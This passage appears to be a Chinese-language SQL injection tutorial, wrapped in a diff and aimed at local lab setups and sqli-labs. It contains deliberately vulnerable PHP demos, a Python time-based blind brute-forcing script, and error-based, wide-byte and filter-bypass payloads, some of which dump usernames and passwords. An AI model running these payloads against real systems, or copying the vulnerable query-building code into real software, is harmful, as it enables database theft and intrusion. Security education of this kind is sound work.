+<pre><code class="lang-php">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=gbk&quot;</span> /&gt;
+    &lt;title&gt;&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;form method=<span class="hljs-string">&quot;GET&quot;</span> action=<span class="hljs-string">&quot;&quot;</span>&gt;
+    ID&#xFF1A;
+    &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;id&quot;</span> /&gt;
+    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;&#x67E5;&#x8BE2;&quot;</span> /&gt;
+&lt;/form&gt;
+<span class="hljs-meta">&lt;?php</span>
+<span class="hljs-comment">// &#x6539;&#x6210;&#x81EA;&#x5DF1;&#x673A;&#x5B50;&#x4E0A;&#x7684;&#x914D;&#x7F6E;&#xFF1A;</span>
+$host = <span class="hljs-string">&apos;127.0.0.1:3306&apos;</span>;
+$un = <span class="hljs-string">&apos;root&apos;</span>;
+$pw = <span class="hljs-string">&apos;123456&apos;</span>;
+$db = <span class="hljs-string">&apos;vul&apos;</span>;
+
+$id = @$_GET[<span class="hljs-string">&apos;id&apos;</span>];
+<span class="hljs-keyword">if</span>($id == <span class="hljs-string">&apos;&apos;</span>)
+    <span class="hljs-keyword">return</span>;
+$conn = @mysqli_connect($host, $un, $pw);
+<span class="hljs-keyword">if</span>(!$conn)
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#x9519;&#x8BEF;&#xFF1A;&apos;</span> . mysqli_error($conn));
+mysqli_select_db($conn, $db);
+$sql = <span class="hljs-string">&quot;select id, username from user_info where id=$id&quot;</span>;
+$res = mysqli_query($conn, $sql);
+<span class="hljs-keyword">if</span>(!$res)
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;&#x6570;&#x636E;&#x5E93;&#x9519;&#x8BEF;&#xFF1A;&apos;</span>. mysqli_error($conn));
+$num = mysqli_num_rows($res);
+$row = mysqli_fetch_row($res);
+<span class="hljs-keyword">if</span>(!$row)
+{ 
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;yes ok&lt;/p&gt;&quot;</span>;
+}
+<span class="hljs-keyword">else</span>
+{
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;yes ok&lt;/p&gt;&quot;</span>;
+}
+mysqli_close($conn);
+<span class="hljs-meta">?&gt;</span>
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<ul>
+<li><p>&#x5224;&#x65AD;&#x6570;&#x636E;&#x5E93;&#x957F;&#x5EA6;</p>
+<blockquote>
+<p>?id = 1 and if(length(database())&gt;2,0,sleep(5))</p>
+</blockquote>
+</li>
+<li><p>&#x6570;&#x636E;&#x5E93;&#x540D;&#x7206;&#x7834;</p>
+<p>&#x8FD9;&#x91CC;&#x6211;&#x7528;&#x7684;&#x662F;&#x904D;&#x5386;&#x6CD5;</p>
+<p>payload:</p>
+<blockquote>
+<p>?id=1 and if(substr(database(),{0},1)=&apos;{1}&apos;,sleep(5),0)</p>
+</blockquote>
+<p>&#x811A;&#x672C;:</p>
+<pre><code class="lang-python"><span class="hljs-keyword">import</span> requests
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">brute_con</span><span class="hljs-params">(strs,length)</span>:</span>
+    url = <span class="hljs-string">&quot;http://192.168.45.152/select2.php&quot;</span>
+    chr_list = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&apos;#$%&amp;()*+,-./:;&lt;=&gt;?@[]^_{|}~&quot;</span>
+    content = <span class="hljs-string">&apos;&apos;</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,length+<span class="hljs-number">1</span>):
+        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> chr_list:
+            sqls = strs.format(str(i),c)
+            param = {<span class="hljs-string">&quot;id&quot;</span>:sqls}
+            <span class="hljs-keyword">try</span>:
+                r = requests.get(url,param,timeout=<span class="hljs-number">6</span>)
+                <span class="hljs-keyword">if</span> r.text != <span class="hljs-string">&quot;&quot;</span>:
+                    <span class="hljs-keyword">continue</span>
+            <span class="hljs-keyword">except</span>:
+                print(c,end=<span class="hljs-string">&quot;&quot;</span>)
+                content += c
+                <span class="hljs-keyword">break</span>
+
+brute_con(<span class="hljs-string">&quot;1 and if(substr(database(),{0},1)=&apos;{1}&apos;,sleep(6),0)&quot;</span>,<span class="hljs-number">3</span>)
+</code></pre>
+<p>&#x5269;&#x4E0B;&#x7684;&#x6B65;&#x9AA4;&#x548C;&#x5E03;&#x5C14;&#x6CE8;&#x5165;&#x7C7B;&#x4F3C;</p>
+</li>
+<li><p>&#x83B7;&#x53D6;&#x8868;&#x540D;</p>
+<p>payload:</p>
+<blockquote>
+<p>?id = 1 and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1)=&apos;{1}&apos; ,sleep(6),0)</p>
+</blockquote>
+</li>
+<li><p>&#x83B7;&#x53D6;&#x5217;&#x540D;:</p>
+<p>payload:</p>
+<blockquote>
+<p>?id = 1 and if(substr((select group_concat(column_name) from information_schema.columns where table_name=&apos;user_info&apos;),{0},1)=&apos;{1}&apos;,sleep(6),0)</p>
+</blockquote>
+</li>
+<li><p>&#x83B7;&#x53D6;&#x6570;&#x636E;
+payload:</p>
+<blockquote>
+<p>?id =1 and if(substr((select group_concat(username,0x3a,userpasswd,0x3a) from user_info),{0},1)=&apos;{1}&apos;,sleep(6),0)</p>
+</blockquote>
+</li>
+</ul>
+<h5 id="&#x62A5;&#x9519;&#x6CE8;&#x5165;">&#x62A5;&#x9519;&#x6CE8;&#x5165;</h5>
+<p>&#x9875;&#x9762;&#x4F1A;&#x8FD4;&#x56DE;MYSQL&#x7684;&#x62A5;&#x9519;&#x4FE1;&#x606F;&#xFF0C;&#x53EF;&#x4EE5;&#x5C06;&#x60F3;&#x8981;&#x5F97;&#x5230;&#x7684;&#x6570;&#x636E;&#x901A;&#x8FC7;&#x62A5;&#x9519;&#x4FE1;&#x606F;&#x5E26;&#x51FA;&#x3002;&#x8FD9;&#x79CD;&#x6CE8;&#x5165;&#x7684;&#x5229;&#x7528;&#x65B9;&#x5F0F;&#x4E0E;MYSQL&#x7684;&#x7248;&#x672C;&#x6709;&#x5F88;&#x5927;&#x7684;&#x5173;&#x8054;&#x3002;</p>
+<ul>
+<li><p>xpath&#x8BED;&#x6CD5;&#x62A5;&#x9519;</p>
+<p>&#x4E24;&#x4E2A;&#x51FD;&#x6570;: updatexml()&#x548C;extractvalue()</p>
+<p>&#x8FD9;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#x90FD;&#x662F;&#x5BF9;XML&#x6587;&#x6863;&#x8FDB;&#x884C;&#x67E5;&#x8BE2;&#x548C;&#x4FEE;&#x6539;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x51FD;&#x6570;&#x8BED;&#x6CD5;&#xFF1A;</p>
+<blockquote>
+<p>updatexml(XML_document, XPath_string, new_value)</p>
+<p>extractvalue(xml_frag, xpath_expr)</p>
+</blockquote>
+<p>&#x62A5;&#x9519;&#x539F;&#x7406;&#xFF1A;&#x8FD9;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x5FC5;&#x987B;&#x662F;&#x6B63;&#x786E;&#x7684;xpath&#x8BED;&#x6CD5;&#xFF0C;&#x4E0D;&#x7136;&#x5C31;&#x4F1A;&#x62A5;&#x9519;&#x3002;</p>
+<p>&#x9002;&#x7528;&#x7248;&#x672C;&#xFF1A;5.1.5+</p>
+<p>&#x5E38;&#x89C1;payload&#xFF1A;</p>
+<blockquote>
+<p>select updatexml(1,concat(0x7e,(select user()),0x7e),1)</p>
+<p>select extractvalue(1,concat(0x7e,(select user()),0x7e))</p>
+</blockquote>
+<p><img src="../images/image-20200519194931452.png" alt="image-20200519194931452"></p>
+</li>
+<li><p>&#x5217;&#x540D;&#x91CD;&#x590D;&#x62A5;&#x9519;</p>
+<p>&#x5728;MYSQL&#x4E2D;&#xFF0C;&#x5217;&#x540D;&#x91CD;&#x590D;&#x4F1A;&#x5BFC;&#x81F4;&#x62A5;&#x9519;&#xFF0C;&#x800C;<code>name_const</code>&#x51FD;&#x6570;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x5236;&#x9020;&#x4E00;&#x4E2A;&#x5217;&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x6765;&#x8FDB;&#x884C;&#x62A5;&#x9519;&#x3002;</p>
+<p>name_const()&#x8BED;&#x6CD5;&#xFF1A;</p>
+<blockquote>
+<p>name_const(name,value)</p>
+<p>name&#x662F;&#x6307;&#x5B9A;&#x7684;&#x5217;&#x540D;&#xFF0C;&#x800C;value&#x662F;&#x7ED9;&#x5B9A;&#x7684;&#x503C;</p>
+</blockquote>
+<p>payload&#xFF1A;</p>
+<blockquote>
+<p>select * from (select name_const(version(),1),name_const(version(),1))as a;</p>
+</blockquote>
+<p><img src="../images/image-20200519200034436.png" alt="image-20200519200034436"></p>
+<p>&#x8FD9;&#x4E2A;&#x62A5;&#x9519;&#x9650;&#x5236;&#x6BD4;&#x8F83;&#x5927;&#xFF0C;&#x9AD8;&#x7248;&#x672C;&#x4FEE;&#x590D;&#x4E86;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#xFF0C;name&#x5FC5;&#x987B;&#x4E3A;&#x5E38;&#x91CF;&#xFF0C;&#x4E0D;&#x53EF;&#x4EE5;&#x662F;&#x53D8;&#x91CF;&#x3002;</p>
+<p>&#x53EA;&#x6709;&#x5728; &#x4F4E;&#x7248;&#x672C;&#x4E2D;&#xFF08;Mysql 5.0.12 &lt;= &#x7248;&#x672C; &lt;= Mysql 5.0.51)&#x624D;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x6210;&#x529F;&#x3002;</p>
+<p>&#x4E00;&#x822C;&#x914D;&#x5408;join&#x7206;&#x7834;&#x5217;&#x540D;&#xFF1A;</p>
+<blockquote>
+<p>mysql&gt; select <em> from (select </em> from user_info a join user_info b )c;
+ERROR 1060 (42S21): Duplicate column name &apos;id&apos;</p>
+<p>mysql&gt; select <em> from (select </em> from user_info a join user_info b using(id)) c;
+ERROR 1060 (42S21): Duplicate column name &apos;username&apos;
+mysql&gt; select <em> from (select </em> from user_info a join user_info b using(id,username)) c;
+ERROR 1060 (42S21): Duplicate column name &apos;userpasswd&apos;</p>
+</blockquote>
+</li>
+</ul>
+<ul>
+<li><p>&#x4E3B;&#x952E;&#x91CD;&#x590D;&#x62A5;&#x9519;</p>
+<p>&#x8FD9;&#x91CC;&#x5229;&#x7528;&#x7684;floor()&#x3001;count()&#x548C;group by&#x6765;&#x9020;&#x6210;&#x4E3B;&#x952E;&#x91CD;&#x590D;&#x62A5;&#x9519;&#x3002;&#x8FD9;&#x4E2A;&#x62A5;&#x9519;&#x5BF9;MYSQL&#x7248;&#x672C;&#x6CA1;&#x4EC0;&#x4E48;&#x8981;&#x6C42;&#xFF0C;&#x6BD4;&#x8F83;&#x901A;&#x7528;&#x3002;</p>
+<p>&#x5E38;&#x89C1;payload:</p>
+<blockquote>
+<p>select count(<em>) from users group by concat(version(),floor(rand(0) </em> 2));</p>
+</blockquote>
+<p>&#x5177;&#x4F53;&#x539F;&#x7406;&#x53C2;&#x8003;&#xFF1A;<a href="https://xz.aliyun.com/t/7169#toc-22" target="_blank">https://xz.aliyun.com/t/7169#toc-22</a></p>
+<p>&#x901A;&#x7528;payload:</p>
+<pre><code class="lang-mysql">select 1 from (select count(*),concat(0x7e,(database()),0x7e),floor(rand(0)*2))a from information_schema.tables group by a )b
+</code></pre>
+<p>&#x8FD9;&#x91CC;&#x4EE5;sqli-lab&#x4E2D;&#x7684;less-5&#x505A;&#x4F8B;&#x5B50;&#xFF1A;</p>
+<ol>
+<li><p>&#x7206;&#x6570;&#x636E;&#x5E93;&#x540D;</p>
+<pre><code class="lang-sql">?id=1&apos; and (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>()*<span class="hljs-number">2</span>))a <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a) b)<span class="hljs-comment">--+</span>
+</code></pre>
+<p><img src="../images/image-20200520144856882.png" alt="image-20200520144856882"></p>
+</li>
+<li><p>&#x67E5;&#x8BE2;&#x8868;&#x540D;</p>
+<pre><code class="lang-sql">?id=1&apos; and (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&apos;security&apos;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>()*<span class="hljs-number">2</span>))a <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a) b)<span class="hljs-comment">--+</span>
+</code></pre>
+<p>&#x56E0;&#x4E3A;&#x8FD9;&#x4E2A;&#x62A5;&#x9519;&#x8F93;&#x51FA;&#x5B57;&#x7B26;&#x6709;&#x957F;&#x5EA6;&#x9650;&#x5236;&#xFF0C;&#x6240;&#x4EE5;&#x4F7F;&#x7528;limit&#x63A7;&#x5236;&#x8F93;&#x51FA;&#x5B57;&#x7B26;&#x7684;&#x957F;&#x5EA6;</p>
+</li>
+<li><p>&#x67E5;&#x8BE2;&#x5217;&#x540D;</p>
+<pre><code class="lang-sql">?id=1&apos; and (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&apos;users&apos;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>()*<span class="hljs-number">2</span>))a <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a) b)<span class="hljs-comment">--+</span>
+</code></pre>
+</li>
+<li><p>&#x67E5;&#x8BE2;&#x5217;&#x7684;&#x5185;&#x5BB9;</p>
+<pre><code class="lang-sql">?id=1&apos; and (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat</span>((<span class="hljs-keyword">select</span> <span class="hljs-keyword">concat</span>(username,<span class="hljs-string">&apos;:&apos;</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.<span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a); <span class="hljs-comment">--+</span>
+</code></pre>
+</li>
+</ol>
+</li>
+<li><p>&#x6570;&#x636E;&#x6EA2;&#x51FA;&#x62A5;&#x9519;</p>
+<p>MYSQL&#x7684;int&#x578B;&#x6570;&#x636E;&#x8303;&#x56F4;:</p>
+<p>| Type      | Storage | Minimum Value        | Maximum Value        |
+| --------- | ------- | -------------------- | -------------------- |
+|           | (Bytes) | (Signed/Unsigned)    | (Signed/Unsigned)    |
+| TINYINT   | 1       | -128                 | 127                  |
+|           |         | 0                    | 255                  |
+| SMALLINT  | 2       | -32768               | 32767                |
+|           |         | 0                    | 65535                |
+| MEDIUMINT | 3       | -8388608             | 8388607              |
+|           |         | 0                    | 16777215             |
+| INT       | 4       | -2147483648          | 2147483647           |
+|           |         | 0                    | 4294967295           |
+| BIGINT    | 8       | -9223372036854775808 | 9223372036854775807  |
+|           |         | 0                    | 18446744073709551615 |</p>
+<ol>
+<li><p>&#x53CC;&#x7CBE;&#x5EA6;&#x6EA2;&#x51FA;&#x62A5;&#x9519;</p>
+<p>exp()&#x51FD;&#x6570;&#x662F;&#x4EE5;e&#x4E3A;&#x5E95;&#x7684;&#x6307;&#x6570;&#x51FD;&#x6570;&#xFF0C;&#x5F53;&#x4F20;&#x9012;&#x7684;&#x6570;&#x5B57;&#x5927;&#x4E8E;709&#x65F6;&#xFF0C;&#x5C31;&#x4F1A;&#x4EA7;&#x751F;&#x6EA2;&#x51FA;&#x62A5;&#x9519;&#x3002;</p>
+<p><img src="../images/image-20200520154317653.png" alt="image-20200520154317653"></p>
+<p>payload:</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">exp</span>(~(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>())a)
+</code></pre>
+<p>~&#x8868;&#x793A;&#x6309;&#x4F4D;&#x53D6;&#x53CD;&#xFF0C;&#x800C;&#x5F53;&#x4E00;&#x4E2A;&#x8BED;&#x53E5;&#x67E5;&#x8BE2;&#x6210;&#x529F;&#x540E;&#x4F1A;&#x8FD4;&#x56DE;0&#xFF0C;0&#x6309;&#x4F4D;&#x53D6;&#x53CD;&#x540E;&#x7684;&#x503C;&#x4E3A; 18446744073709551615 &#xFF0C;&#x4ECE;&#x800C;&#x9020;&#x6210;&#x6EA2;&#x51FA;&#x3002;</p>
+<p><img src="../images/image-20200520155516690.png" alt="image-20200520155516690"></p>
+<p>&#x8FD9;&#x91CC;&#x5229;&#x7528;&#x5BF9;MYSQL&#x7248;&#x672C;&#x6709;&#x9650;&#x5236;&#xFF0C;&#x9002;&#x7528;&#x7248;&#x672C;&#xFF1A; 5.5.53~5.5.49</p>
+<p>&#x4E0E;exp()&#x6709;&#x76F8;&#x540C;&#x6548;&#x679C;&#x7684;&#x51FD;&#x6570;&#x8FD8;&#x6709; pow()&#x548C;cot()</p>
+<p>payload:</p>
+<blockquote>
+<p>select pow(8,~(select * from (select database())a))</p>
+<p>select cot((select * from (select database())a))</p>
+</blockquote>
+<p><img src="../images/image-20200520155847401.png" alt="image-20200520155847401"></p>
+</li>
+<li><p>&#x6574;&#x578B;&#x6EA2;&#x51FA;</p>
+<p>&#x539F;&#x7406;&#xFF1A;&#x5F53;&#x4E00;&#x4E2A;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x67E5;&#x8BE2;&#x6210;&#x529F;&#x540E;&#x4F1A;&#x8FD4;&#x4F1A;&#x4E00;&#x4E2A;0&#xFF0C;&#x8FD9;&#x4E2A;&#x503C;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x8FDB;&#x884C;&#x6570;&#x5B66;&#x8FD0;&#x7B97;&#x3002;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x503C;&#x6765;&#x8FDB;&#x884C;&#x903B;&#x8F91;&#x975E;&#x8FD0;&#x7B97;&#x6765;&#x83B7;&#x5F97;1&#xFF0C;&#x7136;&#x540E;&#x548C;~0&#x76F8;&#x52A0;&#x5C31;&#x4F1A;&#x9020;&#x6210;&#x6574;&#x5F62;&#x6EA2;&#x51FA;&#x3002;</p>
+<pre><code class="lang-sql">mysql&gt; select ~0+1;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &apos;(~(0) + 1)&apos;
+mysql&gt; select !(select * from (select database())a);
++---------------------------------------+
+| !(select * from (select database())a) |
++---------------------------------------+
+|                                     1 |
++---------------------------------------+
+1 row in set (0.00 sec)
+mysql&gt; select ~0+!(select * from (select database())a);
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &apos;(~(0) + (not((select &apos;vul&apos; from dual))))&apos;
+</code></pre>
+</li>
+</ol>
+</li>
+<li><p>&#x51E0;&#x4F55;&#x51FD;&#x6570;&#x62A5;&#x9519;</p>
+<p>&#x51E0;&#x4F55;&#x51FD;&#x6570;&#x5BF9;&#x53C2;&#x6570;&#x683C;&#x5F0F;&#x8981;&#x6C42;&#x5F88;&#x4E25;&#x683C;&#xFF0C;&#x683C;&#x5F0F;&#x662F;&#x7C7B;&#x4F3C;(0 0, 10 10, 20 25, 50 60)&#x8FD9;&#x6837;&#x7684;&#x51E0;&#x4F55;&#x6570;&#x636E;&#xFF0C;&#x5982;&#x679C;&#x53C2;&#x6570;&#x683C;&#x5F0F;&#x51FA;&#x9519;&#x5C31;&#x4F1A;&#x62A5;&#x9519;&#x3002;</p>
+<p>&#x5E38;&#x89C1;&#x51FD;&#x6570;:</p>
+<ul>
+<li><p>GeometryCollection </p>
+<pre><code class="lang-sql">GeometryCollection((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span>* <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))
+</code></pre>
+</li>
+<li><p>polygon</p>
+<pre><code class="lang-sql">polygon((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>())a)b))
+</code></pre>
+</li>
+<li><p>multipoint</p>
+</li>
+<li><p>multilinestring</p>
+</li>
+<li><p>linestring</p>
+</li>
+<li><p>multipolygon</p>
+<p>&#x8FD9;&#x4E9B;&#x51FD;&#x6570;&#x7684;&#x7528;&#x6CD5;&#x90FD;&#x7C7B;&#x4F3C;&#xFF0C;&#x540E;&#x9762;&#x7684;payload&#x5C31;&#x4E0D;&#x5199;&#x4E86;&#x3002;</p>
+</li>
+</ul>
+<p>MYSQL&#x7248;&#x672C;: 5.5.48&lt;= Mysql&#x7248;&#x672C;&#x53F7; &lt;5.7.17</p>
+</li>
+</ul>
+<h5 id="&#x5806;&#x53E0;&#x6CE8;&#x5165;">&#x5806;&#x53E0;&#x6CE8;&#x5165;</h5>
+<p>&#x4F7F;&#x7528;&#x5206;&#x53F7;(;)&#x6765;&#x7ED3;&#x675F;&#x4E0A;&#x4E00;&#x6761;SQL&#x8BED;&#x53E5;,&#x7136;&#x540E;&#x5206;&#x53F7;&#x540E;&#x7EE7;&#x7EED;&#x6784;&#x9020;&#x4E0B;&#x4E00;&#x6761;SQL&#x8BED;&#x53E5;. &#x5806;&#x53E0;&#x6CE8;&#x5165;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x4EFB;&#x610F;&#x7684;SQL&#x8BED;&#x53E5; , &#x4F8B;&#x5982;insert into&#x548C;delete.</p>
+<h5 id="&#x5BBD;&#x5B57;&#x8282;&#x6CE8;&#x5165;">&#x5BBD;&#x5B57;&#x8282;&#x6CE8;&#x5165;</h5>
+<p>&#x5BBD;&#x5B57;&#x8282;&#x6CE8;&#x5165;&#x5229;&#x7528;&#x4E86;PHP&#x811A;&#x672C;&#x7F16;&#x7801;&#x548C;MYSQL&#x6570;&#x636E;&#x5E93;&#x7F16;&#x7801;&#x8BBE;&#x7F6E;&#x4E0D;&#x540C;&#x4EA7;&#x751F;&#x7684;&#x95EE;&#x9898;&#x6765;&#x8FDB;&#x884C;&#x6CE8;&#x5165;</p>
+<p>demo:</p>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
+$conn = mysqli_connect(<span class="hljs-string">&quot;127.0.0.1:3306&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;123456&quot;</span>,<span class="hljs-string">&quot;vul&quot;</span>);
+<span class="hljs-keyword">if</span>(!$conn){
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;mysql connect failure&quot;</span>);
+}
+
+$conn-&gt;query(<span class="hljs-string">&quot;set names gbk;&quot;</span>);
+
+$id = $_GET[<span class="hljs-string">&apos;id&apos;</span>];
+$id = addslashes($id);
+$sql = <span class="hljs-string">&quot;select * from user_info where id=&apos;$id&apos;&quot;</span>;
+$res = mysqli_query($conn,$sql);
+
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;&quot;</span>.$sql.<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>.<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;
+<span class="hljs-keyword">echo</span> mysqli_error($conn);
+
+<span class="hljs-meta">?&gt;</span>
+</code></pre>
+<p>addslashes&#x51FD;&#x6570;&#x5BF9;&#x8F93;&#x5165;&#x7684;id&#x8FDB;&#x884C;&#x8F6C;&#x4E49;&#xFF0C;&#x5982;&#x679C;&#x8F93;&#x5165;&#x5305;&#x62EC; <code>&apos;</code>&#x3001;<code>&quot;</code>&#x548C;<code>\</code>&#x8FD9;&#x4E9B;&#x5B57;&#x7B26;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4F1A;&#x5728;&#x8FD9;&#x4E9B;&#x5B57;&#x7B26;&#x524D;&#x52A0;&#x53CD;&#x659C;&#x6760;&#x3002;</p>
+<p>&#x4F8B;&#x5982;&#xFF1A;</p>
+<p><img src="../images/image-20200520192138578.png" alt="image-20200520192138578"></p>
+<p>&#x4F46;&#x662F;&#xFF0C;&#x5982;&#x679C;&#x8F93;&#x5165;id&#x4E3A;%df%27&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x4F1A;&#x4EA7;&#x751F;&#x62A5;&#x9519;&#x3002;&#x56E0;&#x4E3A;mysql&#x6570;&#x636E;&#x5E93;&#x4F7F;&#x7528;gbk&#x7F16;&#x7801;&#xFF0C;&#x5B83;&#x8BA4;&#x4E3A;&#x4E24;&#x4E2A;&#x5B57;&#x8282;&#x4EE3;&#x8868;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#xFF0C;&#x6240;&#x4EE5;addslashes&#x51FD;&#x6570;&#x63D2;&#x5165;&#x7684; &#x53CD;&#x659C;&#x6760;&#x4F1A;&#x548C;%df &#x5728;&#x4E00;&#x8D77;&#x88AB;&#x5F53;&#x6210;&#x4E00;&#x4E2A;&#x6C49;&#x5B57;&#x7D85;&#xFF0C;&#x4ECE;&#x800C;&#x4F7F;&#x5355;&#x5F15;&#x53F7;&#x9003;&#x9038;&#x51FA;&#x6765;&#x4E86;&#x3002;</p>
+<p><img src="../images/image-20200520192234695.png" alt="image-20200520192234695"></p>
+<h3 id="&#x5E38;&#x89C1;&#x7ED5;&#x8FC7;&#x65B9;&#x5F0F;">&#x5E38;&#x89C1;&#x7ED5;&#x8FC7;&#x65B9;&#x5F0F;</h3>
+<h4 id="andor&#x8FC7;&#x6EE4;&#x7ED5;&#x8FC7;">AND/OR&#x8FC7;&#x6EE4;&#x7ED5;&#x8FC7;</h4>
+<ul>
+<li>&#x5927;&#x5C0F;&#x5199;&#x53D8;&#x5F62;<ul>
+<li>oR&#x3001;OR&#x3001;Or</li>
+</ul>
+</li>
+<li>&#x53CC;&#x5199;&#x7ED5;&#x8FC7;<ul>
+<li>aandnd, oorr</li>
+</ul>
+</li>
+<li>&#x4F7F;&#x7528;&amp;&amp; &#x548C; || &#x4EE3;&#x66FF;&#xFF0C;(&amp;&amp; &#x8981;&#x8FDB;&#x884C;URL&#x7F16;&#x7801;)</li>
+<li>&#x76F4;&#x63A5;&#x7528;&#x7B49;&#x53F7;=&#x62FC;&#x63A5;<ul>
+<li>?id=1=updatexml(1,concat((select user())),1)</li>
+</ul>
+</li>
+<li>&#x4F7F;&#x7528;^&#x62FC;&#x63A5;</li>
+</ul>
+<h4 id="&#x7A7A;&#x683C;&#x8FC7;&#x6EE4;&#x7ED5;&#x8FC7;">&#x7A7A;&#x683C;&#x8FC7;&#x6EE4;&#x7ED5;&#x8FC7;</h4>
+<ul>
+<li>&#x4F7F;&#x7528;/**/&#x7ED5;&#x8FC7;&#x8FC7;&#x6EE4;&#x7A7A;&#x683C;</li>
+<li><p>&#x4E0D;&#x4F7F;&#x7528;&#x7A7A;&#x683C;</p>
+<ul>
+<li>1&apos;||updatexml(1,concat(0x7e,version()),1)</li>
+</ul>
+</li>
+<li>&#x591A;&#x5C42;&#x62EC;&#x53F7;&#x5D4C;&#x5957;</li>
+<li>&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x66FF;&#x4EE3;&#x7A7A;&#x683C;</li>
